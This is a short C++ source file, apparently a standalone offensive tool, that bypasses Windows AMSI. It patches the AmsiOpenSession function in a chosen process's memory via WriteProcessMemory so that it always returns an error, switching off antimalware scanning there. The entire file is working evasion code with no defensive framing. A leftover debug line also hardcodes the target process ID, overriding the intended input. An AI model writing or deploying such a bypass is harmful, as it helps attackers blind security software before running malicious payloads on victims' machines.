/*
Author: kuyaya
Last edited: 25.05.2023
*/

#include <iostream>
#include <Windows.h>
#include <string>

int Fail(LPCSTR functionName, DWORD errorCode) {
    printf("[-] %s failed with error code 0x%X, aborting...\n", functionName, errorCode);
    return 1;
}

int main(int argc, char* argv[])
{
    LPCSTR dllName = "amsi.dll";
    LPCSTR patchFunctionName = "AmsiOpenSession";
    BYTE rawHexBytes[] = { 0xb8, 0x57, 0x00, 0x07, 0x80, 0xc3 };
    DWORD lastStatus;
    MEMORY_BASIC_INFORMATION memoryInformation;
    SIZE_T bytesWritten;

    DWORD pid = GetCurrentProcessId();
    if (argc == 2) {
        pid = std::stoi(argv[1]);
    }
    pid = 12900;
    printf("[DEBUG] Targeting process ID %u\n", pid);

    HMODULE loadedDll = LoadLibraryA(dllName);
    if (!loadedDll) {
        return Fail("LoadLibraryA", GetLastError());
    }
    printf("[DEBUG] Loaded DLL %s with base address 0x%p\n", dllName, loadedDll);

    FARPROC functionAddress = GetProcAddress(loadedDll, patchFunctionName);
    if (!functionAddress) {
        return Fail("GetProcAddress", GetLastError());
    }
    printf("[DEBUG] Got address 0x%p of function %s\n", functionAddress, patchFunctionName);

    HANDLE targetProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
    if (!targetProcess) {
        return Fail("OpenProcess", GetLastError());
    }
    printf("[DEBUG] Opened target process, HANDLE has memory address 0x%p\n", targetProcess);

    SIZE_T queryStatus = VirtualQueryEx(targetProcess, functionAddress, &memoryInformation, sizeof(memoryInformation));
    if (!queryStatus) {
        return Fail("VirtualQueryEx", GetLastError());
    }
    printf("[DEBUG] Queried memory, protect permission is: 0x%X\n", memoryInformation.Protect);

    //BOOL memoryPermissionStatus = VirtualProtectEx(targetProcess, functionAddress, sizeof(rawHexBytes), PAGE_EXECUTE_READWRITE, &lastStatus);
    //if (!memoryPermissionStatus) {
    //    return Fail("VirtualProtectEx", GetLastError());
    //}
    //printf("[DEBUG] Changed permission status, previous permission was 0x%X\n", lastStatus);

    BOOL overwriteStatus = WriteProcessMemory(targetProcess, functionAddress, rawHexBytes, sizeof(rawHexBytes), &bytesWritten);
    if (!overwriteStatus) {
        return Fail("WriteProcessMemory", GetLastError());
    }
    printf("[DEBUG] Overwrote %I64u bytes in memory with status code 0x%X\n", bytesWritten, overwriteStatus);

    CloseHandle(targetProcess);
}

